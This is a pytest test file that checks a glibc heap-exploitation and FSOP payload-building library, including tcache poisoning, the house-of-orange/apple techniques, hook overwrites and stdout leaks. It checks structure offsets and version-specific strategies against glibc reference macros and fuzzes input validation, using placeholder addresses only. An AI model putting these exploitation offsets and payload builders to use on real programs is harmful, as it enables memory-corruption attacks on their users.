"""Independent glibc allocator/FSOP vectors and deterministic fail-closed fuzz.

Oracles: upstream glibc 2.23/2.39 ``malloc/malloc.c`` macros
``request2size``, ``csize2tidx``, ``set_max_fast``, ``PROTECT_PTR`` and tcache
constants; the glibc 2.26 tcache proposal; glibc 2.34 NEWS hook removal; and
glibc ``struct_FILE.h``/``libioP.h`` LP64 offsets. No engine output prepares an
expected value, and all produced bytes remain inert.
"""
from __future__ import annotations

import json
import random
import struct

import pytest

import heap_families as families
import heap_primitives as primitives
import heap_version_matrix as matrix
import pwn_fsop as fsop


def clean_call(expected_error, function, *args, **kwargs):
    try:
        return function(*args, **kwargs)
    except expected_error:
        return None
    except BaseException as exc:
        pytest.fail(f"undeclared {type(exc).__name__}: {exc}")


def qword(data, offset=0):
    return struct.unpack_from("<Q", data, offset)[0]


def dword(data, offset=0):
    return struct.unpack_from("<I", data, offset)[0]


def ref_request2size(request, bits):
    size_sz, alignment, minsize = bits // 8, bits // 4, bits // 2
    padded = request + size_sz + alignment - 1
    return minsize if padded < minsize else padded & ~(alignment - 1)


def ref_csize2tidx(chunk_size, bits):
    alignment, minsize = bits // 4, bits // 2
    return (chunk_size - minsize + alignment - 1) // alignment


def ref_default_max_fast(bits):
    """glibc set_max_fast(DEFAULT_MXFAST), an internal chunk-size limit."""
    size_sz, alignment = bits // 8, bits // 4
    request = 64 * size_sz // 4
    return (request + size_sz) & ~(alignment - 1)


def ref_tunable_max_fast(bits):
    """Largest internal max-fast chunk accepted by glibc's mallopt path."""
    size_sz, alignment = bits // 8, bits // 4
    request = 80 * size_sz // 4
    return (request + size_sz) & ~(alignment - 1)


@pytest.mark.parametrize("minor", range(23, 40))
def test_version_matrix_matches_upstream_release_transitions(minor):
    profile = matrix.profile_for(f"2.{minor}")
    expected = {
        "tcache": minor >= 26,
        "tcache_key_check": minor >= 29,
        "safe_linking": minor >= 32,
        "aligned_next_check": minor >= 32,
        "malloc_hooks_effective": minor <= 33,
        "tcache_precedes_fastbin": minor >= 26,
        "fastbin_head_double_free_check": True,
        "tcache_count": 7 if minor >= 26 else 0,
        "tcache_entry_words": 2 if minor >= 29 else (1 if minor >= 26 else 0),
    }
    for field, value in expected.items():
        assert getattr(profile, field) == value
    assert profile.version == f"2.{minor}" and profile.minor == minor
    assert profile.tcache_max_chunk_lp64 == (ref_request2size(1032, 64) if minor >= 26 else 0)
    assert profile.tcache_max_chunk_lp32 == (ref_request2size(516, 32) if minor >= 26 else 0)


@pytest.mark.parametrize("bits,request_size,chunk,index", [
    (64, 0, 0x20, 0), (64, 24, 0x20, 0), (64, 25, 0x30, 1),
    (64, 40, 0x30, 1), (64, 41, 0x40, 2), (64, 1032, 0x410, 63),
    (32, 0, 0x10, 0), (32, 12, 0x10, 0), (32, 13, 0x18, 1),
    (32, 20, 0x18, 1), (32, 21, 0x20, 2), (32, 516, 0x208, 63),
])
def test_request_size_and_tcache_class_math(bits, request_size, chunk, index):
    assert ref_request2size(request_size, bits) == chunk
    assert ref_csize2tidx(chunk, bits) == index
    build = families.build_tcache_dup(
        glibc_version="2.39", bits=bits, chunk_addr=0x10000,
        chunk_size=chunk, next_chunk_addr=0,
    )
    assert build.facts["chunk_size"] == chunk


def test_default_fastbin_internal_limits_and_profile_block():
    assert (ref_default_max_fast(64), ref_default_max_fast(32)) == (0x80, 0x40)
    assert (ref_tunable_max_fast(64), ref_tunable_max_fast(32)) == (0xA0, 0x50)
    for bits, size in ((64, 0x80), (32, 0x40)):
        built = matrix.build_versioned_fastbin(
            action="dup", glibc_version="2.39", bits=bits,
            chunk_addr=0x10000, chunk_size=size, peer_or_fake_addr=0x20000,
        )
        assert int.from_bytes(built.slice("fastbin_chunk.size"), "little") == size | 1

    for bits, size in ((64, 0xA0), (32, 0x50)):
        family = families.build_fastbin_dup(
            glibc_version="2.39", bits=bits, chunk_addr=0x10000,
            chunk_size=size, next_chunk_addr=0x20000,
            max_fast_chunk_size=size,
        )
        assert family.facts["chunk_size"] == size
        if bits == 32:
            versioned = matrix.build_versioned_fastbin(
                action="dup", glibc_version="2.39", bits=bits,
                chunk_addr=0x10000, chunk_size=size,
                peer_or_fake_addr=0x20000, max_fast_chunk=size,
            )
            assert int.from_bytes(versioned.slice("fastbin_chunk.size"), "little") == size | 1

    build = matrix.build_allocator_profile_block("2.32")
    fields = struct.unpack("<4sBBBBHHI", build.payload)
    assert fields == (b"R5BV", 2, 32, 0b11111, 2, 7, 0x410, 0)


def test_safe_linking_key_and_hook_boundaries():
    kwargs = dict(freed_chunk_addr=0x55555000, chunk_size=0x90, target_addr=0x404040)
    plain = families.build_tcache_poison(glibc_version="2.31", **kwargs)
    safe = families.build_tcache_poison(glibc_version="2.32", **kwargs)
    assert qword(plain.payload) == 0x404040
    assert qword(safe.payload) == 0x404040 ^ (0x55555010 >> 12)
    assert len(families.build_tcache_dup(
        glibc_version="2.28", chunk_addr=0x10000,
        chunk_size=0x90, next_chunk_addr=0,
    ).payload) == 8
    assert len(families.build_tcache_dup(
        glibc_version="2.29", chunk_addr=0x10000,
        chunk_size=0x90, next_chunk_addr=0,
    ).payload) == 16
    assert matrix.build_versioned_hook_overwrite(
        glibc_version="2.33", hook_address=0x5000,
        replacement_address=0x123456789ABCDEF0,
    ).payload == struct.pack("<Q", 0x123456789ABCDEF0)
    with pytest.raises(matrix.VersionMatrixError):
        matrix.build_versioned_hook_overwrite(
            glibc_version="2.34", hook_address=0x5000,
            replacement_address=0x6000,
        )


def family_vectors():
    return {
        "tcache_dup": families.build_tcache_dup(glibc_version="2.31", chunk_addr=0x1000, chunk_size=0x90, next_chunk_addr=0x2000),
        "tcache_poison": families.build_tcache_poison(glibc_version="2.35", freed_chunk_addr=0x1000, chunk_size=0x90, target_addr=0x2000),
        "fastbin_dup": families.build_fastbin_dup(glibc_version="2.35", chunk_addr=0x1000, chunk_size=0x70, next_chunk_addr=0x2000),
        "fastbin_poison": families.build_fastbin_poison(glibc_version="2.31", victim_chunk_addr=0x1000, fake_chunk_addr=0x3000, chunk_size=0x70),
        "unsorted_bin_leak": families.build_unsorted_bin_leak(glibc_version="2.39", chunk_addr=0x1000, chunk_size=0x500, main_arena_addr=0x7000),
        "house_of_force": families.build_house_of_force(glibc_version="2.28", top_chunk_addr=0x1000, target_addr=0x2010),
        "house_of_orange": families.build_house_of_orange(glibc_version="2.23", old_top_addr=0x1000, old_top_size=0x500, main_arena_bin_addr=0x7000, io_list_all_addr=0x8000, fake_file_addr=0x3000, fake_vtable_addr=0x4000, call_target=0x9000, lock_addr=0xA000),
        "house_of_apple": families.build_house_of_apple(glibc_version="2.39", fake_file_addr=0x3000, wide_data_addr=0x4000, wide_vtable_addr=0x5000, io_wfile_jumps_addr=0x7000, call_target=0x9000, lock_addr=0xA000),
        "house_of_einherjar": families.build_house_of_einherjar(glibc_version="2.31", fake_chunk_addr=0x1000, victim_chunk_addr=0x1100, victim_chunk_size=0x90),
        "house_of_botcake": families.build_house_of_botcake(glibc_version="2.35", overlapping_chunk_addr=0x1000, chunk_size=0x100, target_addr=0x3000),
        "house_of_spirit": families.build_house_of_spirit(glibc_version="2.35", fake_chunk_addr=0x1000, chunk_size=0x90),
        "large_bin_attack": families.build_large_bin_attack(glibc_version="2.29", large_chunk_addr=0x1000, chunk_size=0x500, target_addr=0x4000, fd_addr=0x7000, bk_addr=0x7000),
        "tcache_stashing_unlink": families.build_tcache_stashing_unlink(glibc_version="2.31", smallbin_chunk_addr=0x1000, chunk_size=0x90, target_addr=0x4000, smallbin_head_addr=0x7000),
    }


def test_every_family_builder_has_an_independent_field_vector():
    row = family_vectors()
    assert set(row) == set(families.BUILDERS)
    assert qword(row["tcache_dup"].payload) == 0x2000
    assert qword(row["tcache_poison"].payload) == 0x2001
    assert qword(row["fastbin_dup"].segment("fastbin_chunk"), 8) == 0x71
    assert qword(row["fastbin_dup"].segment("fastbin_chunk"), 16) == 0x2001
    assert qword(row["fastbin_poison"].segment("poisoned_fastbin_victim"), 16) == 0x3000
    assert qword(row["fastbin_poison"].segment("fake_fastbin_next")) == 0x70
    assert qword(row["unsorted_bin_leak"].payload, 16) == 0x7060
    assert row["house_of_force"].facts["bridge_chunk_size"] == 0x1000
    assert qword(row["house_of_orange"].segment("fake_file"), 0xD8) == 0x4000
    assert qword(row["house_of_orange"].segment("fake_vtable"), 0x18) == 0x9000
    assert qword(row["house_of_apple"].segment("fake_file"), 0xA0) == 0x4000
    assert qword(row["house_of_apple"].segment("fake_wide_data"), 0xE0) == 0x5000
    assert qword(row["house_of_einherjar"].segment("victim_header")) == 0x100
    assert qword(row["house_of_botcake"].payload) == 0x3001
    assert qword(row["house_of_spirit"].segment("fake_chunk"), 8) == 0x91
    assert qword(row["large_bin_attack"].segment("forged_largebin_chunk"), 0x28) == 0x3FE0
    assert qword(row["tcache_stashing_unlink"].segment("corrupted_smallbin_chunk"), 0x18) == 0x3FF0


def test_family_dispatcher_matches_direct_builder():
    kwargs = dict(glibc_version="2.35", freed_chunk_addr=0x1000,
                  chunk_size=0x90, target_addr=0x2000)
    assert families.build_heap("tcache-poisoning", **kwargs) == families.build_tcache_poison(**kwargs)


def test_groom_and_every_primitive_builder_vector():
    operations = primitives.plan_heap_groom(
        chunk_size=0x90, live_chunks=4, holes=2, guard_chunks=1, refill=True)
    expected = (
        ("alloc", 0, "left-guard"), ("alloc", 1, "layout"),
        ("alloc", 2, "layout"), ("alloc", 3, "layout"),
        ("alloc", 4, "layout"), ("alloc", 5, "right-guard"),
        ("free", 3, "make-hole"), ("free", 1, "make-hole"),
        ("alloc", 1, "controlled-refill"), ("alloc", 3, "controlled-refill"),
    )
    assert tuple((x.opcode, x.slot, x.phase) for x in operations) == expected
    groom = primitives.build_heap_groom_plan(
        chunk_size=0x90, live_chunks=4, holes=2, guard_chunks=1, refill=True)
    encoded = bytearray(struct.pack("<4sHH", b"R5BG", 1, len(expected)))
    phase = {"left-guard": 1, "right-guard": 2, "layout": 3,
             "make-hole": 4, "controlled-refill": 5}
    for opcode, slot, label in expected:
        encoded.extend(struct.pack("<BBHI", {"alloc": 1, "free": 2}[opcode],
                                   phase[label], slot, 0x90))
    assert groom.payload == bytes(encoded)

    old = primitives.build_uaf_reuse(glibc_version="2.25", freed_chunk_addr=0x1000, chunk_size=0x70, replacement_addr=0x3000)
    new = primitives.build_uaf_reuse(glibc_version="2.35", freed_chunk_addr=0x1000, chunk_size=0x70, replacement_addr=0x3000)
    assert "fastbin" in old.strategy and "tcache" in new.strategy
    assert "tcache-dup" in primitives.build_double_free(glibc_version="2.31", chunk_addr=0x1000, guard_or_next_addr=0x2000, chunk_size=0x70).strategy
    assert primitives.build_type_confusion(object_addr=0x1000, type_tag=3, data_pointer=0x2000, logical_length=0x80, call_pointer=0x3000).payload == struct.pack("<QQQQ", 3, 0x2000, 0x80, 0x3000)
    assert primitives.build_off_by_one(buffer_addr=0x1000, overwrite_offset=4, replacement_byte=0x90, fill_byte=0x42).payload == b"BBBB\x90"
    assert primitives.build_null_byte_poison(buffer_addr=0x1000, victim_size_field_addr=0x1010, original_size=0x191).payload == b"A" * 16 + b"\0"
    assert primitives.build_integer_overflow_heap(header_addr=0x1000, count=0x40000001, element_size=4, copy_count=16).payload == struct.pack("<IIII", 0x40000001, 4, 4, 16)
    assert primitives.build_cpp_vtable(object_addr=0x1000, fake_vtable_addr=0x2000, call_targets=(0x3000, 0x4000), original_fields=b"ABCDEFGH").payload == struct.pack("<Q", 0x2000) + b"ABCDEFGH" + struct.pack("<QQ", 0x3000, 0x4000)


def test_fsop_documented_offsets_and_version_strategies():
    common = dict(file_addr=0x3000, lock=0x6000, system=0x9000)
    old = fsop.build_fsop("house_of_apple", "2.23", vtable_addr=0x4000, **common)
    assert old.strategy == "legacy-unvalidated-vtable"
    assert qword(old.segments[0].data, 0xD8) == 0x4000
    assert qword(old.segments[1].data, 0x18) == 0x9000
    validated = fsop.build_fsop("house_of_apple", "2.24", wide_data_addr=0x4000, wide_vtable_addr=0x5000, io_wfile_jumps=0x7000, **common)
    assert validated.strategy == "validated-wide-vtable"
    modern = fsop.build_fsop("house_of_apple", "2.34", wide_data_addr=0x4000, wide_vtable_addr=0x5000, io_wfile_jumps=0x7000, **common)
    assert modern.strategy == "hookless-house-of-apple"
    assert qword(modern.segments[0].data, 0xA0) == 0x4000
    assert dword(modern.segments[0].data, 0xC0) == 1
    assert qword(modern.segments[0].data, 0xD8) == 0x7000
    assert qword(modern.segments[1].data, 0xE0) == 0x5000
    assert qword(modern.segments[2].data, 0x68) == 0x9000
    assert fsop.build_fsop("house_of_apple", "2.39", wide_data_addr=0x4000, wide_vtable_addr=0x5000, io_wfile_jumps=0x7000, **common).strategy == "hookless-house-of-apple"

    leak = fsop.build_fsop("stdout_leak", "2.39", file_addr=0x3000,
                           leak_start=0x1000, leak_end=0x1100,
                           lock=0x5000, io_file_jumps=0x7000)
    data = leak.segments[0].data
    assert (dword(data), qword(data, 0x10), qword(data, 0x20),
            qword(data, 0x28), dword(data, 0x70), qword(data, 0x88),
            qword(data, 0xD8)) == (0xFBAD1800, 0x1000, 0x1000, 0x1100,
                                  1, 0x5000, 0x7000)


FAMILY_FUZZ = [
    (families.build_tcache_dup, dict(glibc_version="2.31", chunk_addr=0x1000, chunk_size=0x90)),
    (families.build_tcache_poison, dict(glibc_version="2.35", freed_chunk_addr=0x1000, chunk_size=0x90, target_addr=0x2000)),
    (families.build_fastbin_dup, dict(glibc_version="2.35", chunk_addr=0x1000, chunk_size=0x70, next_chunk_addr=0x2000)),
    (families.build_fastbin_poison, dict(glibc_version="2.35", victim_chunk_addr=0x1000, fake_chunk_addr=0x2000, chunk_size=0x70)),
    (families.build_unsorted_bin_leak, dict(glibc_version="2.37", chunk_addr=0x1000, chunk_size=0x500, main_arena_addr=0x7000)),
    (families.build_house_of_force, dict(glibc_version="2.28", top_chunk_addr=0x1000, target_addr=0x2010)),
    (families.build_house_of_orange, dict(glibc_version="2.23", old_top_addr=0x1000, old_top_size=0x500, main_arena_bin_addr=0x7000, io_list_all_addr=0x8000, fake_file_addr=0x3000, fake_vtable_addr=0x4000, call_target=0x9000, lock_addr=0xA000)),
    (families.build_house_of_apple, dict(glibc_version="2.39", fake_file_addr=0x3000, wide_data_addr=0x4000, wide_vtable_addr=0x5000, io_wfile_jumps_addr=0x7000, call_target=0x9000, lock_addr=0xA000)),
    (families.build_house_of_einherjar, dict(glibc_version="2.31", fake_chunk_addr=0x1000, victim_chunk_addr=0x1100, victim_chunk_size=0x90)),
    (families.build_house_of_botcake, dict(glibc_version="2.35", overlapping_chunk_addr=0x1000, chunk_size=0x100, target_addr=0x3000)),
    (families.build_house_of_spirit, dict(glibc_version="2.35", fake_chunk_addr=0x1000, chunk_size=0x90)),
    (families.build_large_bin_attack, dict(glibc_version="2.29", large_chunk_addr=0x1000, chunk_size=0x500, target_addr=0x4000, fd_addr=0x7000, bk_addr=0x7000)),
    (families.build_tcache_stashing_unlink, dict(glibc_version="2.31", smallbin_chunk_addr=0x1000, chunk_size=0x90, target_addr=0x4000, smallbin_head_addr=0x7000)),
]


@pytest.mark.parametrize("function,kwargs", FAMILY_FUZZ)
@pytest.mark.parametrize("version", [None, b"2.35", "", "2.", "3.35", "2.x", "2." + "9" * 1000])
def test_every_family_builder_fails_closed_on_malformed_version(function, kwargs, version):
    clean_call(families.HeapBuildError, function,
               **(kwargs | {"glibc_version": version}))


PRIMITIVE_LOCAL_FUZZ = [
    (primitives.plan_heap_groom, dict(chunk_size=0x90, live_chunks=None)),
    (primitives.build_heap_groom_plan, dict(chunk_size=0x90, holes=[])),
    (primitives.build_uaf_reuse, dict(glibc_version="2.35", freed_chunk_addr=0x1000, chunk_size=0x90, replacement_addr=0x2000, bits=128)),
    (primitives.build_double_free, dict(glibc_version="2.31", chunk_addr=0x1000, guard_or_next_addr=0x2000, chunk_size=0x90, bits=0)),
    (primitives.build_type_confusion, dict(object_addr=0x1000, type_tag=1, data_pointer=0x2000, logical_length=4, bits=True)),
    (primitives.build_off_by_one, dict(buffer_addr=None, overwrite_offset=4, replacement_byte=0)),
    (primitives.build_null_byte_poison, dict(buffer_addr=0x1000, victim_size_field_addr=0x1010, original_size=0x191, fill_byte={})),
    (primitives.build_integer_overflow_heap, dict(header_addr=0x1000, count=0x40000001, element_size=4, copy_count=16, integer_bits=8)),
    (primitives.build_cpp_vtable, dict(object_addr=0x1000, fake_vtable_addr=0x2000, call_targets=(0x3000,), bits=16)),
]


@pytest.mark.parametrize("function,kwargs", PRIMITIVE_LOCAL_FUZZ)
def test_every_primitive_entrypoint_has_a_clean_local_rejection(function, kwargs):
    clean_call(primitives.PrimitiveBuildError, function, **kwargs)


PRIMITIVE_EXCEPTION_LEAKS = [
    pytest.param(primitives.plan_heap_groom, dict(chunk_size=None),
                 id="plan-groom-base-error"),
    pytest.param(primitives.build_heap_groom_plan, dict(chunk_size=None),
                 id="build-groom-base-error"),
    pytest.param(primitives.build_uaf_reuse,
                 dict(glibc_version="2.35", freed_chunk_addr=None,
                      chunk_size=0x90, replacement_addr=0x2000),
                 id="uaf-delegated-error"),
    pytest.param(primitives.build_double_free,
                 dict(glibc_version="2.31", chunk_addr=None,
                      guard_or_next_addr=0x2000, chunk_size=0x90),
                 id="double-free-delegated-error"),
    pytest.param(primitives.build_type_confusion,
                 dict(object_addr=None, type_tag=1, data_pointer=0x2000,
                      logical_length=4), id="type-confusion-base-error"),
    pytest.param(primitives.build_null_byte_poison,
                 dict(buffer_addr=None, victim_size_field_addr=0x1010,
                      original_size=0x191), id="null-poison-base-error"),
    pytest.param(primitives.build_integer_overflow_heap,
                 dict(header_addr=None, count=0x40000001,
                      element_size=4, copy_count=16),
                 id="integer-overflow-base-error"),
    pytest.param(primitives.build_cpp_vtable,
                 dict(object_addr=None, fake_vtable_addr=0x2000,
                      call_targets=(0x3000,)), id="cpp-vtable-base-error"),
]


@pytest.mark.parametrize("function,kwargs", PRIMITIVE_EXCEPTION_LEAKS)
def test_bug_primitive_entrypoint_wraps_validation_error(function, kwargs):
    with pytest.raises(primitives.PrimitiveBuildError):
        function(**kwargs)


@pytest.mark.parametrize("version", [None, "", "2.", "1.39", "2.x", "2.22", "2.40", "2." + "9" * 1000])
def test_matrix_entrypoints_fail_closed_on_unknown_versions(version):
    clean_call(matrix.VersionMatrixError, matrix.profile_for, version)
    clean_call(matrix.VersionMatrixError, matrix.build_allocator_profile_block, version)
    clean_call(matrix.VersionMatrixError, matrix.build_versioned_tcache,
               action="poison", glibc_version=version,
               chunk_addr=0x1000, chunk_size=0x90, peer_or_target_addr=0x2000)
    clean_call(matrix.VersionMatrixError, matrix.build_versioned_fastbin,
               action="dup", glibc_version=version,
               chunk_addr=0x1000, chunk_size=0x70, peer_or_fake_addr=0x2000)
    clean_call(matrix.VersionMatrixError, matrix.build_versioned_hook_overwrite,
               glibc_version=version,
               hook_address=0x1000, replacement_address=0x2000)


def test_seeded_scalar_and_oversized_fuzz():
    rng = random.Random(0x223239)
    for _ in range(128):
        value = rng.randrange(-(1 << 80), 1 << 80)
        clean_call(primitives.PrimitiveBuildError, primitives.build_off_by_one,
                   buffer_addr=value,
                   overwrite_offset=value, replacement_byte=value, fill_byte=value)
        clean_call(families.HeapBuildError, families.build_tcache_poison,
                   glibc_version="2.39",
                   freed_chunk_addr=value, chunk_size=value, target_addr=value)
    with pytest.raises(primitives.PrimitiveBuildError):
        primitives.build_cpp_vtable(object_addr=0x1000, fake_vtable_addr=0x3000,
                                    call_targets=(0x4000,) * 33)
    with pytest.raises(primitives.PrimitiveBuildError):
        primitives.build_cpp_vtable(object_addr=0x1000, fake_vtable_addr=0x3000,
                                    call_targets=(0x4000,), original_fields=b"A" * 4097)


@pytest.mark.parametrize("bad", [None, -1, True, 1.5, [], {}, "x", 1 << 100])
def test_fsop_builder_malformed_values_fail_closed(bad):
    clean_call(fsop.FSOPError, fsop.build_fsop,
               "stdout_leak", "2.39", file_addr=bad,
               leak_start=0x1000, leak_end=0x1100,
               lock=0x5000, io_file_jumps=0x7000)


def test_fsop_cli_fuzz_and_valid_vector(tmp_path, capsys):
    rng = random.Random(0xF50F)
    valid_blob = json.dumps({
        "glibc_version": "2.39", "file_addr": 0x3000,
        "leak_start": 0x1000, "leak_end": 0x1100,
        "lock": 0x5000, "io_file_jumps": 0x7000,
    }).encode()
    bit_flipped = bytearray(valid_blob)
    bit_flipped[0] ^= 1
    inputs = [b"", b"{", b'{"glibc_version":"2.39"', rng.randbytes(128),
              bytes(bit_flipped), b"[]", b'{"glibc_version":"3.39"}']
    for index, data in enumerate(inputs):
        path = tmp_path / f"bad-{index}.json"
        path.write_bytes(data)
        assert fsop.main(["stdout_leak", str(path)]) == 2
    huge = tmp_path / "huge.json"
    huge.write_bytes(b" " * (fsop.MAX_JSON + 1))
    assert fsop.main(["stdout_leak", str(huge)]) == 2
    config = tmp_path / "valid.json"
    config.write_bytes(valid_blob)
    assert fsop.main(["stdout_leak", str(config), "--json"]) == 0
    assert json.loads(capsys.readouterr().out)["strategy"] == "stdout-write-window"


def test_bug_family_rejects_chunk_above_default_lp64_fastbin_limit():
    assert ref_default_max_fast(64) == 0x80
    with pytest.raises(families.HeapBuildError):
        families.build_fastbin_dup(glibc_version="2.39", chunk_addr=0x1000,
                                   chunk_size=0x90, next_chunk_addr=0x2000)


def test_bug_family_rejects_chunk_above_default_lp32_fastbin_limit():
    assert ref_default_max_fast(32) == 0x40
    with pytest.raises(families.HeapBuildError):
        families.build_fastbin_dup(glibc_version="2.39", bits=32, chunk_addr=0x10000,
                                   chunk_size=0x48, next_chunk_addr=0x20000)


def test_bug_matrix_rejects_chunk_above_default_lp32_fastbin_limit():
    with pytest.raises(matrix.VersionMatrixError):
        matrix.build_versioned_fastbin(action="dup", glibc_version="2.39", bits=32,
                                       chunk_addr=0x10000, chunk_size=0x48,
                                       peer_or_fake_addr=0x20000)


def test_bug_family_rejects_chunk_above_tunable_fastbin_ceiling():
    assert ref_tunable_max_fast(64) == 0xA0
    with pytest.raises(families.HeapBuildError):
        families.build_fastbin_dup(
            glibc_version="2.39", chunk_addr=0x1000,
            chunk_size=0xB0, next_chunk_addr=0x2000,
            max_fast_chunk_size=0xB0,
        )


def test_bug_matrix_rejects_chunk_above_tunable_fastbin_ceiling():
    assert ref_tunable_max_fast(64) == 0xA0
    with pytest.raises(matrix.VersionMatrixError):
        matrix.build_versioned_fastbin(
            action="dup", glibc_version="2.39", chunk_addr=0x1000,
            chunk_size=0xB0, peer_or_fake_addr=0x2000,
            max_fast_chunk=0xB0,
        )


def test_bug_matrix_honors_valid_tuned_lp64_fastbin_limit():
    built = matrix.build_versioned_fastbin(
        action="dup", glibc_version="2.39", chunk_addr=0x1000,
        chunk_size=0xA0, peer_or_fake_addr=0x2000,
        max_fast_chunk=0xA0,
    )
    assert int.from_bytes(built.slice("fastbin_chunk.size"), "little") == 0xA1


def test_bug_versioned_tcache_malformed_size_uses_declared_error():
    with pytest.raises(matrix.VersionMatrixError):
        matrix.build_versioned_tcache(action="poison", glibc_version="2.39",
                                      chunk_addr=0x1000, chunk_size=None,
                                      peer_or_target_addr=0x2000)


def test_bug_versioned_fastbin_malformed_size_uses_declared_error():
    with pytest.raises(matrix.VersionMatrixError):
        matrix.build_versioned_fastbin(action="dup", glibc_version="2.39",
                                       chunk_addr=0x1000, chunk_size=None,
                                       peer_or_fake_addr=0x2000)


@pytest.mark.parametrize("function,kwargs", [
    pytest.param(
        matrix.build_versioned_tcache,
        dict(action="poison", glibc_version="2.39", chunk_addr=None,
             chunk_size=0x90, peer_or_target_addr=0x2000),
        id="tcache-delegated-error",
    ),
    pytest.param(
        matrix.build_versioned_fastbin,
        dict(action="dup", glibc_version="2.39", chunk_addr=None,
             chunk_size=0x70, peer_or_fake_addr=0x2000),
        id="fastbin-delegated-error",
    ),
    pytest.param(
        matrix.build_versioned_fastbin,
        dict(action="dup", glibc_version="2.39", chunk_addr=0x1000,
             chunk_size=0x70, peer_or_fake_addr=0x2000,
             max_fast_chunk="x"),
        id="fastbin-base-error",
    ),
    pytest.param(
        matrix.build_versioned_hook_overwrite,
        dict(glibc_version="2.33", hook_address=None,
             replacement_address=0x2000),
        id="hook-base-error",
    ),
])
def test_bug_matrix_entrypoint_wraps_validation_error(function, kwargs):
    clean_call(matrix.VersionMatrixError, function, **kwargs)


def test_bug_heap_family_unknown_version_fails_closed():
    with pytest.raises(families.HeapBuildError):
        families.build_unsorted_bin_leak(glibc_version="2.40", chunk_addr=0x1000,
                                         chunk_size=0x500, main_arena_addr=0x7000)


def test_bug_heap_dispatcher_uses_declared_error():
    with pytest.raises(families.HeapBuildError):
        families.build_heap("tcache_dup")


def test_bug_fsop_unknown_version_fails_closed():
    with pytest.raises(fsop.FSOPError):
        fsop.build_fsop("stdout_leak", "2.40", file_addr=0x3000,
                        leak_start=0x1000, leak_end=0x1100,
                        lock=0x5000, io_file_jumps=0x7000)


def test_bug_fsop_surrogate_command_uses_declared_error():
    with pytest.raises(fsop.FSOPError):
        fsop.build_fsop("house_of_apple", "2.39", file_addr=0x3000,
                        wide_data_addr=0x4000, wide_vtable_addr=0x5000,
                        lock=0x6000, system=0x9000, io_wfile_jumps=0x7000,
                        command="  \ud800")


def test_bug_fsop_cli_help_is_guarded():
    assert fsop.main(["--help"]) == 0
